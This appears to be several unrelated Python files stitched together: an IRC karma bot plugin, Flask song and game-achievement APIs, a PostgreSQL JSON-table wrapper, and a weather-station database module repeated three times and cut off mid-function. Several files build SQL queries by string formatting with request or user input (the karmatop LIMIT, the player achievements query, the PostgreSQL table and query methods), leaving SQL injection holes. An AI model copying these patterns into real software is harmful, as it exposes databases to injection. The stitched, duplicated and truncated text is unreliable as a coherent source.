Modified work Copyright 2015 Red Hat

Licensed under the Eiffel Forum License 2.
"""
from __future__ import unicode_literals
from sopel.module import rate, rule, commands, require_privilege, OP
from sopel.tools import Identifier


@rate(10)
@rule(r'^([\S]+?)\+\+$')
# @commands('inc')
def promote_karma(bot, trigger):
    """
    Update karma status for specify IRC user if get '++' message.
    """
    if (trigger.is_privmsg):
        return bot.say('People like it when you tell them good things.')
    if (bot.db.get_nick_id(Identifier(trigger.group(1))) ==
            bot.db.get_nick_id(Identifier(trigger.nick))):
        return bot.say('You may not give yourself karma!')
    current_karma = bot.db.get_nick_value(trigger.group(1), 'karma')
    if not current_karma:
        current_karma = 0
    else:
        current_karma = int(current_karma)
    current_karma += 1

    bot.db.set_nick_value(trigger.group(1), 'karma', current_karma)
    bot.say(trigger.group(1) + ' == ' + str(current_karma))


@rate(10)
@rule(r'^([\S]+?)\-\-$')
# @commands('dec')
def demote_karma(bot, trigger):
    """
    Update karma status for specify IRC user if get '--' message.
    """
    if (trigger.is_privmsg):
        return bot.say('Say it to their face!')
    if (bot.db.get_nick_id(Identifier(trigger.group(1))) ==
            bot.db.get_nick_id(Identifier(trigger.nick))):
        return bot.say('You may not reduce your own karma!')
    current_karma = bot.db.get_nick_value(trigger.group(1), 'karma')
    if not current_karma:
        current_karma = 0
    else:
        current_karma = int(current_karma)
    current_karma -= 1

    bot.db.set_nick_value(trigger.group(1), 'karma', current_karma)
    bot.say(trigger.group(1) + ' == ' + str(current_karma))


@rate(10)
@rule(r'^([\S]+?)\=\=$')
def show_karma(bot, trigger):
    """
    Update karma status for specify IRC user if get '--' message.
    """
    current_karma = bot.db.get_nick_value(trigger.group(1), 'karma')
    if not current_karma:
        current_karma = 0
    else:
        current_karma = int(current_karma)

    bot.say(trigger.group(1) + ' == ' + str(current_karma))


@commands('karma')
# @example('.karma nick')
def karma(bot, trigger):
    """
    Command to show the karma status for specify IRC user.
    """
    nick = trigger.nick
    if trigger.group(2):
        nick = trigger.group(2).strip().split()[0]

    karma = bot.db.get_nick_value(nick, 'karma')
    if not karma:
        karma = '0'
    bot.say("%s == %s" % (nick, karma))


@require_privilege(OP)
@commands('setkarma')
# @example('.setkarma nick 99')
def set_karma(bot, trigger):
    """
    Set karma status for specific IRC user.
    """

    if trigger.group(2):
        nick = trigger.group(2).strip().split()[0]
        value = int(trigger.group(2).strip().split()[1])

    bot.db.set_nick_value(nick, 'karma', value)
    bot.say("%s == %s" % (nick, value))


@rate(10)
@commands('karmatop')
# @example('.karmatop 3')
def top_karma(bot, trigger):
    """
    Show karma status for the top n number of IRC users.
    """
    try:
        top_limit = int(trigger.group(2).strip())
    except ValueError:
        top_limit = 5

    query = "SELECT slug, value FROM nick_values NATURAL JOIN nicknames \
        WHERE key = 'karma' ORDER BY value DESC LIMIT %d"                    
    karmalist = bot.db.execute(query % top_limit).fetchall()                    
    for user in karmalist:
        bot.say("%s == %s" % (user[0], user[1]))

from flask import jsonify, request, make_response, g
from sqlalchemy.exc import IntegrityError
from . import api
from .. import db, auth
from ..models import Song
from .errors import bad_request, route_not_found

@api.route('/songs/<name>')
def song(name):
    return jsonify(name=name)

@api.route('/songs/<int:id>')
def get_song(id):
    song = Song.query.filter_by(id=id).first()
    if not song:
        return route_not_found(song)
    return make_response(jsonify(song.to_json()), 200)

@api.route('/songs/', methods=['POST'])
@auth.login_required
def new_song():
    # check if json
    if request.headers['content_type'] == 'application/json':
        payload = request.get_json()

        # validate payload
        if not request.json or \
        not 'title' in payload or \
        not 'artist' in payload or \
        not 'url' in payload:
            message = 'the payload aint right'
            return bad_request(message)

        # validate that song doesn't already exist
        # TODO: this needs to be way more sophisticated
        if Song.query.filter_by(url=payload['url']).first():
            message = 'this song already exists'
            return bad_request(message)

        # add song
        try:
            song = Song(title=payload['title'], \
                        artist=payload['artist'], \
                        url=payload['url'], \
                        user=g.current_user)
            db.session.add(song)
            db.session.commit()
            return make_response(jsonify(song.to_json()), 200)
        except IntegrityError:
            message = 'this song already exists'
            return bad_request(message)
        except AssertionError as ex:
            return bad_request(ex.args[0])
        except Exception as ex:
            template = "An exception of type {0} occured. Arguments:\n{1!r}"
            message = template.format(type(ex).__name__, ex.args)
            return bad_request(message)

    else:
        message = 'that aint json'
        return bad_request(message)

@api.route('/songs/<int:id>/related')
def get_song_relations(id):
    top = request.args.get('top')                    
    song = Song.query.filter_by(id=id).first()
    if not song:
        return route_not_found(song)
    return make_response(jsonify(song.get_related_songs_json(top)), 200)






from flask import request

from api import *

import faf.db as db

SELECT_ACHIEVEMENTS_QUERY = """SELECT
                    ach.id,
                    ach.type,
                    ach.total_steps,
                    ach.revealed_icon_url,
                    ach.unlocked_icon_url,
                    ach.initial_state,
                    ach.experience_points,
                    COALESCE(name_langReg.value, name_lang.value, name_def.value) as name,
                    COALESCE(desc_langReg.value, desc_lang.value, desc_def.value) as description
                FROM achievement_definitions ach
                LEFT OUTER JOIN messages name_langReg
                    ON ach.name_key = name_langReg.key
                        AND name_langReg.language = %(language)s
                        AND name_langReg.region = %(region)s
                LEFT OUTER JOIN messages name_lang
                    ON ach.name_key = name_lang.key
                        AND name_lang.language = %(language)s
                LEFT OUTER JOIN messages name_def
                    ON ach.name_key = name_def.key
                        AND name_def.language = 'en'
                        AND name_def.region = 'US'
                LEFT OUTER JOIN messages desc_langReg
                    ON ach.description_key = desc_langReg.key
                        AND desc_langReg.language = %(language)s
                        AND desc_langReg.region = %(region)s
                LEFT OUTER JOIN messages desc_lang
                    ON ach.description_key = desc_lang.key
                        AND desc_lang.language = %(language)s
                LEFT OUTER JOIN messages desc_def
                    ON ach.description_key = desc_def.key
                        AND desc_def.language = 'en'
                        AND desc_def.region = 'US'"""


@app.route('/achievements')
def achievements_list():
    """Lists all achievement definitions.

    HTTP Parameters::

        language    string  The preferred language to use for strings returned by this method
        region      string  The preferred region to use for strings returned by this method

    :return:
        If successful, this method returns a response body with the following structure::

            {
              "updated_achievements": [
                {
                  "id": string,
                  "name": string,
                  "description": string,
                  "type": string,
                  "total_steps": integer,
                  "initial_state": string,
                  "experience_points": integer,
                  "revealed_icon_url": string,
                  "unlocked_icon_url": string
                }
              ]
            }
    """
    language = request.args.get('language', 'en')
    region = request.args.get('region', 'US')

    with db.connection:
        cursor = db.connection.cursor(db.pymysql.cursors.DictCursor)
        cursor.execute(SELECT_ACHIEVEMENTS_QUERY + " ORDER BY `order` ASC",
                       {
                           'language': language,
                           'region': region
                       })

        return flask.jsonify(items=cursor.fetchall())


@app.route('/achievements/<achievement_id>')
def achievements_get(achievement_id):
    """Gets an achievement definition.

    HTTP Parameters::

        language    string  The preferred language to use for strings returned by this method
        region      string  The preferred region to use for strings returned by this method

    :param achievement_id: ID of the achievement to get

    :return:
        If successful, this method returns a response body with the following structure::

            {
              "id": string,
              "name": string,
              "description": string,
              "type": string,
              "total_steps": integer,
              "initial_state": string,
              "experience_points": integer,
              "revealed_icon_url": string,
              "unlocked_icon_url": string
            }
    """
    language = request.args.get('language', 'en')
    region = request.args.get('region', 'US')

    with db.connection:
        cursor = db.connection.cursor(db.pymysql.cursors.DictCursor)
        cursor.execute(SELECT_ACHIEVEMENTS_QUERY + "WHERE ach.id = %(achievement_id)s",
                       {
                           'language': language,
                           'region': region,
                           'achievement_id': achievement_id
                       })

        return cursor.fetchone()


@app.route('/achievements/<achievement_id>/increment', methods=['POST'])
def achievements_increment(achievement_id):
    """Increments the steps of the achievement with the given ID for the currently authenticated player.

    HTTP Parameters::

        player_id    integer ID of the player to increment the achievement for
        steps        string  The number of steps to increment

    :param achievement_id: ID of the achievement to increment

    :return:
        If successful, this method returns a response body with the following structure::

            {
              "current_steps": integer,
              "current_state": string,
              "newly_unlocked": boolean,
            }
    """
    # FIXME get player ID from OAuth session
    player_id = int(request.form.get('player_id'))
    steps = int(request.form.get('steps', 1))

    return flask.jsonify(increment_achievement(achievement_id, player_id, steps))


@app.route('/achievements/<achievement_id>/setStepsAtLeast', methods=['POST'])
def achievements_set_steps_at_least(achievement_id):
    """Sets the steps of an achievement. If the steps parameter is less than the current number of steps
     that the player already gained for the achievement, the achievement is not modified.
     This function is NOT an endpoint."""
    # FIXME get player ID from OAuth session
    player_id = int(request.form.get('player_id'))
    steps = int(request.form.get('steps', 1))

    return flask.jsonify(set_steps_at_least(achievement_id, player_id, steps))


@app.route('/achievements/<achievement_id>/unlock', methods=['POST'])
def achievements_unlock(achievement_id):
    """Unlocks an achievement for the currently authenticated player.

    HTTP Parameters::

        player_id    integer ID of the player to unlock the achievement for

    :param achievement_id: ID of the achievement to unlock

    :return:
        If successful, this method returns a response body with the following structure::

            {
              "newly_unlocked": boolean,
            }
    """
    # FIXME get player ID from OAuth session
    player_id = int(request.form.get('player_id'))

    return flask.jsonify(unlock_achievement(achievement_id, player_id))


@app.route('/achievements/<achievement_id>/reveal', methods=['POST'])
def achievements_reveal(achievement_id):
    """Reveals an achievement for the currently authenticated player.

    HTTP Parameters::

        player_id    integer ID of the player to reveal the achievement for

    :param achievement_id: ID of the achievement to reveal

    :return:
        If successful, this method returns a response body with the following structure::

            {
              "current_state": string,
            }
    """
    # FIXME get player ID from OAuth session
    player_id = int(request.form.get('player_id'))

    return flask.jsonify(reveal_achievement(achievement_id, player_id))


@app.route('/achievements/updateMultiple', methods=['POST'])
def achievements_update_multiple():
    """Updates multiple achievements for the currently authenticated player.

    HTTP Body:
        In the request body, supply data with the following structure::

            {
              "player_id": integer,
              "updates": [
                "achievement_id": string,
                "update_type": string,
                "steps": integer
              ]
            }

        ``updateType`` being one of "REVEAL", "INCREMENT" or "UNLOCK"

    :return:
        If successful, this method returns a response body with the following structure::

            {
              "updated_achievements": [
                "achievement_id": string,
                "current_state": string,
                "current_steps": integer,
                "newly_unlocked": boolean,
              ],
            }
    """
    # FIXME get player ID from OAuth session
    player_id = request.json['player_id']

    updates = request.json['updates']

    result = dict(updated_achievements=[])

    for update in updates:
        achievement_id = update['achievement_id']
        update_type = update['update_type']

        update_result = dict(achievement_id=achievement_id)

        if update_type == 'REVEAL':
            reveal_result = reveal_achievement(achievement_id, player_id)
            update_result['current_state'] = reveal_result['current_state']
            update_result['current_state'] = 'REVEALED'
        elif update_type == 'UNLOCK':
            unlock_result = unlock_achievement(achievement_id, player_id)
            update_result['newly_unlocked'] = unlock_result['newly_unlocked']
            update_result['current_state'] = 'UNLOCKED'
        elif update_type == 'INCREMENT':
            increment_result = increment_achievement(achievement_id, player_id, update['steps'])
            update_result['current_steps'] = increment_result['current_steps']
            update_result['current_state'] = increment_result['current_state']
            update_result['newly_unlocked'] = increment_result['newly_unlocked']
        elif update_type == 'SET_STEPS_AT_LEAST':
            set_steps_at_least_result = set_steps_at_least(achievement_id, player_id, update['steps'])
            update_result['current_steps'] = set_steps_at_least_result['current_steps']
            update_result['current_state'] = set_steps_at_least_result['current_state']
            update_result['newly_unlocked'] = set_steps_at_least_result['newly_unlocked']

        result['updated_achievements'].append(update_result)

    return result


@app.route('/players/<int:player_id>/achievements')
def achievements_list_player(player_id):
    """Lists the progress of achievements for a player.

    :param player_id: ID of the player.

    :return:
        If successful, this method returns a response body with the following structure::

            {
              "items": [
                {
                  "achievement_id": string,
                  "state": string,
                  "current_steps": integer,
                  "create_time": long,
                  "update_time": long
                }
              ]
            }
    """
    with db.connection:
        cursor = db.connection.cursor(db.pymysql.cursors.DictCursor)
        cursor.execute("""SELECT
                            achievement_id,
                            current_steps,
                            state,
                            UNIX_TIMESTAMP(create_time) as create_time,
                            UNIX_TIMESTAMP(update_time) as update_time
                        FROM player_achievements
                        WHERE player_id = '%s'""" % player_id)                    

        return flask.jsonify(items=cursor.fetchall())


def increment_achievement(achievement_id, player_id, steps):
    steps_function = lambda current_steps, new_steps: current_steps + new_steps
    return update_steps(achievement_id, player_id, steps, steps_function)


def set_steps_at_least(achievement_id, player_id, steps):
    steps_function = lambda current_steps, new_steps: max(current_steps, new_steps)
    return update_steps(achievement_id, player_id, steps, steps_function)


def update_steps(achievement_id, player_id, steps, steps_function):
    """Increments the steps of an achievement. This function is NOT an endpoint.

    :param achievement_id: ID of the achievement to increment
    :param player_id: ID of the player to increment the achievement for
    :param steps: The number of steps to increment
    :param steps_function: The function to use to calculate the new steps value. Two parameters are passed; the current
    step count and the parameter ``steps``

    :return:
        If successful, this method returns a dictionary with the following structure::

            {
              "current_steps": integer,
              "current_state": string,
              "newly_unlocked": boolean,
            }
    """
    achievement = achievements_get(achievement_id)

    with db.connection:
        cursor = db.connection.cursor(db.pymysql.cursors.DictCursor)
        cursor.execute("""SELECT
                            current_steps,
                            state
                        FROM player_achievements
                        WHERE achievement_id = %s AND player_id = %s""",
                       (achievement_id, player_id))

        player_achievement = cursor.fetchone()

        new_state = 'REVEALED'
        newly_unlocked = False

        current_steps = player_achievement['current_steps'] if player_achievement else 0
        new_current_steps = steps_function(current_steps, steps)

        if new_current_steps >= achievement['total_steps']:
            new_state = 'UNLOCKED'
            new_current_steps = achievement['total_steps']
            newly_unlocked = player_achievement['state'] != 'UNLOCKED' if player_achievement else True

        cursor.execute("""INSERT INTO player_achievements (player_id, achievement_id, current_steps, state)
                        VALUES
                            (%(player_id)s, %(achievement_id)s, %(current_steps)s, %(state)s)
                        ON DUPLICATE KEY UPDATE
                            current_steps = VALUES(current_steps),
                            state = VALUES(state)""",
                       {
                           'player_id': player_id,
                           'achievement_id': achievement_id,
                           'current_steps': new_current_steps,
                           'state': new_state,
                       })

    return dict(current_steps=new_current_steps, current_state=new_state, newly_unlocked=newly_unlocked)


def unlock_achievement(achievement_id, player_id):
    """Unlocks a standard achievement. This function is NOT an endpoint.

    :param achievement_id: ID of the achievement to unlock
    :param player_id: ID of the player to unlock the achievement for

    :return:
        If successful, this method returns a dictionary with the following structure::

            {
              "newly_unlocked": boolean,
            }
    """
    newly_unlocked = False

    with db.connection:
        cursor = db.connection.cursor(db.pymysql.cursors.DictCursor)

        cursor.execute('SELECT type FROM achievement_definitions WHERE id = %s', achievement_id)
        achievement = cursor.fetchone()
        if achievement['type'] != 'STANDARD':
            raise InvalidUsage('Only standard achievements can be unlocked directly', status_code=400)

        cursor.execute("""SELECT
                            state
                        FROM player_achievements
                        WHERE achievement_id = %s AND player_id = %s""",
                       (achievement_id, player_id))

        player_achievement = cursor.fetchone()

        new_state = 'UNLOCKED'
        newly_unlocked = not player_achievement or player_achievement['state'] != 'UNLOCKED'

        cursor.execute("""INSERT INTO player_achievements (player_id, achievement_id, state)
                        VALUES
                            (%(player_id)s, %(achievement_id)s, %(state)s)
                        ON DUPLICATE KEY UPDATE
                            state = VALUES(state)""",
                       {
                           'player_id': player_id,
                           'achievement_id': achievement_id,
                           'state': new_state,
                       })

    return dict(newly_unlocked=newly_unlocked)


def reveal_achievement(achievement_id, player_id):
    """Reveals an achievement.

    :param achievement_id: ID of the achievement to unlock
    :param player_id: ID of the player to reveal the achievement for

    :return:
        If successful, this method returns a response body with the following structure::

            {
              "current_state": string,
            }
    """
    with db.connection:
        cursor = db.connection.cursor(db.pymysql.cursors.DictCursor)
        cursor.execute("""SELECT
                            state
                        FROM player_achievements
                        WHERE achievement_id = %s AND player_id = %s""",
                       (achievement_id, player_id))

        player_achievement = cursor.fetchone()

        new_state = player_achievement['state'] if player_achievement else 'REVEALED'

        cursor.execute("""INSERT INTO player_achievements (player_id, achievement_id, state)
                        VALUES
                            (%(player_id)s, %(achievement_id)s, %(state)s)
                        ON DUPLICATE KEY UPDATE
                            state = VALUES(state)""",
                       {
                           'player_id': player_id,
                           'achievement_id': achievement_id,
                           'state': new_state,
                       })

    return dict(current_state=new_state)

import psycopg2
from PostgresNoSQLTable import PostgresNoSQLTable


class PostgresNoSQLClient(object):
    SQL_CREATE_JSON_TABLE = 'CREATE TABLE %s (id SERIAL, data JSON);'
    SQL_DROP_JSON_TABLE = 'DROP TABLE IF EXISTS %s;'
    SQL_TABLE_EXISTS = "SELECT EXISTS(SELECT relname FROM pg_class WHERE relname='%s')"                    

    def __init__(self):
        self.connection = None
        self.cursor = None

    def connect(self, host, database, user=None, password=None):
        self.connection = psycopg2.connect(host=host, database=database, user=user, password=password)
        self.cursor = self.connection.cursor()

    def close(self):
        return self.connection.close()

    def create_table(self, table_name):
        self.cursor.execute(self.SQL_CREATE_JSON_TABLE % table_name)                    
        self.commit()
        return PostgresNoSQLTable(table_name, self.connection)

    def drop_table(self, table_name):
        self.cursor.execute(self.SQL_DROP_JSON_TABLE % table_name)                    
        self.commit()

    def get_table(self, table_name):
        if self.table_exists(table_name):
            return PostgresNoSQLTable(table_name, self.connection)
        else:
            return None

    def commit(self):
        self.connection.commit()

    def table_exists(self, table_name):
        exists = False
        try:
            self.cursor.execute(self.SQL_TABLE_EXISTS % table_name)                    
            exists = self.cursor.fetchone()[0]
        except psycopg2.Error as e:
            print e
        return exists

import json
import psycopg2


class PostgresNoSQLTable(object):

    SQL_INSERT_JSON = "INSERT INTO %s(data) VALUES('%s') RETURNING id"                    
    SQL_QUERY_JSON = 'SELECT %s FROM %s WHERE %s'
    SQL_GET_JSON = 'SELECT * FROM %s WHERE id=%s'

    def __init__(self, name, connection):
        self.name = name
        self.connection = connection
        self.cursor = self.connection.cursor()

    def commit(self):
        self.connection.commit()

    def put(self, data):
        self.cursor.execute(self.SQL_INSERT_JSON % (self.name, json.dumps(data)))                    
        return self.cursor.fetchone()[0]

    def get(self, id):
        self.cursor.execute(self.SQL_GET_JSON % (self.name, id))                    
        return self.cursor.fetchone()

    def query(self, query='True', columns='*'):
        self.cursor.execute(self.SQL_QUERY_JSON % (columns, self.name, query))                    
        rows = [item for item in self.cursor.fetchall()]
        return rows

    def drop(self):
        raise Exception('not implemented yet!')

#!/usr/bin/python
import MySQLdb, datetime, httplib, json, os

class mysql_database:
    def __init__(self):
    	credentials_file = os.path.join(os.path.dirname(__file__), "credentials.mysql")
    	f = open(credentials_file, "r")
        credentials = json.load(f)
        f.close()
        for key, value in credentials.items(): #remove whitespace
            credentials[key] = value.strip()
            
        self.connection = MySQLdb.connect(credentials["HOST"], credentials["USERNAME"], credentials["PASSWORD"], credentials["DATABASE"])
        self.cursor = self.connection.cursor()

    def execute(self, query):                    
        try:
            self.cursor.execute(query)                    
            self.connection.commit()
        except:
            self.connection.rollback()
            raise

    def query(self, query):
        cursor = self.connection.cursor(MySQLdb.cursors.DictCursor)
        cursor.execute(query)
        return cursor.fetchall()

    def __del__(self):
        self.connection.close()

class oracle_apex_database:
    def __init__(self, path, host = "apex.oracle.com"):
        self.host = host
        self.path = path
        self.conn = httplib.HTTPSConnection(self.host)
        self.credentials = None
        credentials_file = os.path.join(os.path.dirname(__file__), "credentials.oracle")
        
        if os.path.isfile(credentials_file):
            f = open(credentials_file, "r")
            self.credentials = json.load(f)
            f.close()
            for key, value in self.credentials.items(): #remove whitespace
                self.credentials[key] = value.strip()
        else:
            print "credentials file not found"                    

        self.default_data = { "Content-type": "text/plain", "Accept": "text/plain" }

    def upload(self, id, ambient_temperature, ground_temperature, air_quality, air_pressure, humidity, wind_direction, wind_speed, wind_gust_speed, rainfall, created):                    
        #keys must follow the names expected by the Orcale Apex REST service
        oracle_data = {
	    "LOCAL_ID": str(id),
	    "AMB_TEMP": str(ambient_temperature),
	    "GND_TEMP": str(ground_temperature),
	    "AIR_QUALITY": str(air_quality),
	    "AIR_PRESSURE": str(air_pressure),
	    "HUMIDITY": str(humidity),
	    "WIND_DIRECTION": str(wind_direction),
	    "WIND_SPEED": str(wind_speed),
	    "WIND_GUST_SPEED": str(wind_gust_speed),
	    "RAINFALL": str(rainfall),
	    "READING_TIMESTAMP": str(created) }                    

        for key in oracle_data.keys():
            if oracle_data[key] == str(None):
                del oracle_data[key]

        return self.https_post(oracle_data)

    def https_post(self, data, attempts = 3):
        attempt = 0
        headers = dict(self.default_data.items() + self.credentials.items() + data.items())
        success = False
        response_data = None

        while not success and attempt < attempts:
            try:
                self.conn.request("POST", self.path, None, headers)
                response = self.conn.getresponse()
                response_data = response.read()
                print response.status, response.reason, response_data                    
                success = response.status == 200 or response.status == 201
            except Exception as e:
                print "Unexpected error", e                    
            finally:
                attempt += 1

        return response_data if success else None

    def __del__(self):
        self.conn.close()

class weather_database:
    def __init__(self):
        self.db = mysql_database()
        self.insert_template = "INSERT INTO WEATHER_MEASUREMENT (AMBIENT_TEMPERATURE, GROUND_TEMPERATURE, AIR_QUALITY, AIR_PRESSURE, HUMIDITY, WIND_DIRECTION, WIND_SPEED, WIND_GUST_SPEED, RAINFALL, CREATED) VALUES({0}, {1}, {2}, {3}, {4}, {5}, {6}, {7}, {8}, '{9}');"                    
        self.update_template =  "UPDATE WEATHER_MEASUREMENT SET REMOTE_ID={0} WHERE ID={1};"                    
        self.upload_select_template = "SELECT * FROM WEATHER_MEASUREMENT WHERE REMOTE_ID IS NULL;"

    def is_number(self, s):
        try:
            float(s)
            return True
        except ValueError:
            return False

    def is_none(self, val):
        return val if val != None else "NULL"

    def insert(self, ambient_temperature, ground_temperature, air_quality, air_pressure, humidity, wind_direction, wind_speed, wind_gust_speed, rainfall, created = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")):
        insert_query = self.insert_template.format(                    
            self.is_none(ambient_temperature),                     
            self.is_none(ground_temperature),                     
            self.is_none(air_quality),                     
            self.is_none(air_pressure),                     
            self.is_none(humidity),                     
            self.is_none(wind_direction),                     
            self.is_none(wind_speed),                     
            self.is_none(wind_gust_speed),                     
            self.is_none(rainfall),                     
            created)                    

        print insert_query                    

        self.db.execute(insert_query)                    

    def upload(self):
        results = self.db.query(self.upload_select_template)

        rows_count = len(results)
        if rows_count > 0:
            print rows_count, "rows to send..."                    
            odb = oracle_apex_database(path = "/pls/apex/raspberrypi/weatherstation/submitmeasurement")

            if odb.credentials == None:
                return #cannot upload

            for row in results:
                response_data = odb.upload(
                    row["ID"], 
                    row["AMBIENT_TEMPERATURE"], 
                    row["GROUND_TEMPERATURE"],
                    row["AIR_QUALITY"], 
                    row["AIR_PRESSURE"], 
                    row["HUMIDITY"], 
                    row["WIND_DIRECTION"], 
                    row["WIND_SPEED"], 
                    row["WIND_GUST_SPEED"], 
                    row["RAINFALL"], 
                    row["CREATED"].strftime("%Y-%m-%dT%H:%M:%S"))

                if response_data != None and response_data != "-1":
                    json_dict = json.loads(response_data)
                    oracle_id = json_dict["ORCL_RECORD_ID"]
                    if self.is_number(oracle_id):
                        local_id = str(row["ID"])
                        update_query = self.update_template.format(oracle_id, local_id)                    
                        self.db.execute(update_query)                    
                        print "ID:", local_id, "updated with REMOTE_ID =", oracle_id                    
                else:
                    print "Bad response from Oracle"                    
        else:
            print "Nothing to upload"                    

#!/usr/bin/python
import MySQLdb, datetime, httplib, json, os

class mysql_database:
    def __init__(self):
    	credentials_file = os.path.join(os.path.dirname(__file__), "credentials.mysql")
    	f = open(credentials_file, "r")
        credentials = json.load(f)
        f.close()
        for key, value in credentials.items(): #remove whitespace
            credentials[key] = value.strip()
            
        self.connection = MySQLdb.connect(credentials["HOST"], credentials["USERNAME"], credentials["PASSWORD"], credentials["DATABASE"])
        self.cursor = self.connection.cursor()

    def execute(self, query):                    
        try:
            self.cursor.execute(query)                    
            self.connection.commit()
        except:
            self.connection.rollback()
            raise

    def query(self, query):
        cursor = self.connection.cursor(MySQLdb.cursors.DictCursor)
        cursor.execute(query)
        return cursor.fetchall()

    def __del__(self):
        self.connection.close()

class oracle_apex_database:
    def __init__(self, path, host = "apex.oracle.com"):
        self.host = host
        self.path = path
        self.conn = httplib.HTTPSConnection(self.host)
        self.credentials = None
        credentials_file = os.path.join(os.path.dirname(__file__), "credentials.oracle")
        
        if os.path.isfile(credentials_file):
            f = open(credentials_file, "r")
            self.credentials = json.load(f)
            f.close()
            for key, value in self.credentials.items(): #remove whitespace
                self.credentials[key] = value.strip()
        else:
            print "credentials file not found"                    

        self.default_data = { "Content-type": "text/plain", "Accept": "text/plain" }

    def upload(self, id, ambient_temperature, ground_temperature, air_quality, air_pressure, humidity, wind_direction, wind_speed, wind_gust_speed, rainfall, created):                    
        #keys must follow the names expected by the Orcale Apex REST service
        oracle_data = {
	    "LOCAL_ID": str(id),
	    "AMB_TEMP": str(ambient_temperature),
	    "GND_TEMP": str(ground_temperature),
	    "AIR_QUALITY": str(air_quality),
	    "AIR_PRESSURE": str(air_pressure),
	    "HUMIDITY": str(humidity),
	    "WIND_DIRECTION": str(wind_direction),
	    "WIND_SPEED": str(wind_speed),
	    "WIND_GUST_SPEED": str(wind_gust_speed),
	    "RAINFALL": str(rainfall),
	    "READING_TIMESTAMP": str(created) }                    

        for key in oracle_data.keys():
            if oracle_data[key] == str(None):
                del oracle_data[key]

        return self.https_post(oracle_data)

    def https_post(self, data, attempts = 3):
        attempt = 0
        headers = dict(self.default_data.items() + self.credentials.items() + data.items())
        success = False
        response_data = None

        while not success and attempt < attempts:
            try:
                self.conn.request("POST", self.path, None, headers)
                response = self.conn.getresponse()
                response_data = response.read()
                print response.status, response.reason, response_data                    
                success = response.status == 200 or response.status == 201
            except Exception as e:
                print "Unexpected error", e                    
            finally:
                attempt += 1

        return response_data if success else None

    def __del__(self):
        self.conn.close()

class weather_database:
    def __init__(self):
        self.db = mysql_database()
        self.insert_template = "INSERT INTO WEATHER_MEASUREMENT (AMBIENT_TEMPERATURE, GROUND_TEMPERATURE, AIR_QUALITY, AIR_PRESSURE, HUMIDITY, WIND_DIRECTION, WIND_SPEED, WIND_GUST_SPEED, RAINFALL, CREATED) VALUES({0}, {1}, {2}, {3}, {4}, {5}, {6}, {7}, {8}, '{9}');"                    
        self.update_template =  "UPDATE WEATHER_MEASUREMENT SET REMOTE_ID={0} WHERE ID={1};"                    
        self.upload_select_template = "SELECT * FROM WEATHER_MEASUREMENT WHERE REMOTE_ID IS NULL;"

    def is_number(self, s):
        try:
            float(s)
            return True
        except ValueError:
            return False

    def is_none(self, val):
        return val if val != None else "NULL"

    def insert(self, ambient_temperature, ground_temperature, air_quality, air_pressure, humidity, wind_direction, wind_speed, wind_gust_speed, rainfall, created = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")):
        insert_query = self.insert_template.format(                    
            self.is_none(ambient_temperature),                     
            self.is_none(ground_temperature),                     
            self.is_none(air_quality),                     
            self.is_none(air_pressure),                     
            self.is_none(humidity),                     
            self.is_none(wind_direction),                     
            self.is_none(wind_speed),                     
            self.is_none(wind_gust_speed),                     
            self.is_none(rainfall),                     
            created)                    

        print insert_query                    

        self.db.execute(insert_query)                    

    def upload(self):
        results = self.db.query(self.upload_select_template)

        rows_count = len(results)
        if rows_count > 0:
            print rows_count, "rows to send..."                    
            odb = oracle_apex_database(path = "/pls/apex/raspberrypi/weatherstation/submitmeasurement")

            if odb.credentials == None:
                return #cannot upload

            for row in results:
                response_data = odb.upload(
                    row["ID"], 
                    row["AMBIENT_TEMPERATURE"], 
                    row["GROUND_TEMPERATURE"],
                    row["AIR_QUALITY"], 
                    row["AIR_PRESSURE"], 
                    row["HUMIDITY"], 
                    row["WIND_DIRECTION"], 
                    row["WIND_SPEED"], 
                    row["WIND_GUST_SPEED"], 
                    row["RAINFALL"], 
                    row["CREATED"].strftime("%Y-%m-%dT%H:%M:%S"))

                if response_data != None and response_data != "-1":
                    json_dict = json.loads(response_data)
                    oracle_id = json_dict["ORCL_RECORD_ID"]
                    if self.is_number(oracle_id):
                        local_id = str(row["ID"])
                        update_query = self.update_template.format(oracle_id, local_id)                    
                        self.db.execute(update_query)                    
                        print "ID:", local_id, "updated with REMOTE_ID =", oracle_id                    
                else:
                    print "Bad response from Oracle"                    
        else:
            print "Nothing to upload"                    

#!/usr/bin/python
import MySQLdb, datetime, httplib, json, os

class mysql_database:
    def __init__(self):
    	credentials_file = os.path.join(os.path.dirname(__file__), "credentials.mysql")
    	f = open(credentials_file, "r")
        credentials = json.load(f)
        f.close()
        for key, value in credentials.items(): #remove whitespace
            credentials[key] = value.strip()
            
        self.connection = MySQLdb.connect(credentials["HOST"], credentials["USERNAME"], credentials["PASSWORD"], credentials["DATABASE"])
        self.cursor = self.connection.cursor()

    def execute(self, query):                    
        try:
            self.cursor.execute(query)                    
            self.connection.commit()
        except:
            self.connection.rollback()
            raise

    def query(self, query):
        cursor = self.connection.cursor(MySQLdb.cursors.DictCursor)
        cursor.execute(query)
        return cursor.fetchall()

    def __del__(self):
        self.connection.close()

class oracle_apex_database:
    def __init__(self, path, host = "apex.oracle.com"):
        self.host = host
        self.path = path
        self.conn = httplib.HTTPSConnection(self.host)
        self.credentials = None
        credentials_file = os.path.join(os.path.dirname(__file__), "credentials.oracle")
        
        if os.path.isfile(credentials_file):
            f = open(credentials_file, "r")
            self.credentials = json.load(f)
            f.close()
            for key, value in self.credentials.items(): #remove whitespace
                self.credentials[key] = value.strip()
        else:
            print "credentials file not found"                    

        self.default_data = { "Content-type": "text/plain", "Accept": "text/plain" }

    def upload(self, id, ambient_temperature, ground_temperature, air_quality, air_pressure, humidity, wind_direction, wind_speed, wind_gust_speed, rainfall, created):                    
        #keys must follow the names expected by the Orcale Apex REST service
        oracle_data = {
	    "LOCAL_ID": str(id),
	    "AMB_TEMP": str(ambient_temperature),
	    "GND_TEMP": str(ground_temperature),
	    "AIR_QUALITY": str(air_quality),
	    "AIR_PRESSURE": str(air_pressure),
	    "HUMIDITY": str(humidity),
	    "WIND_DIRECTION": str(wind_direction),
	    "WIND_SPEED": str(wind_speed),
	    "WIND_GUST_SPEED": str(wind_gust_speed),
	    "RAINFALL": str(rainfall),
	    "READING_TIMESTAMP": str(created) }                    

        for key in oracle_data.keys():
            if oracle_data[key] == str(None):
                del oracle_data[key]

        return self.https_post(oracle_data)

    def https_post(self, data, attempts = 3):
        attempt = 0
        headers = dict(self.default_data.items() + self.credentials.items() + data.items())
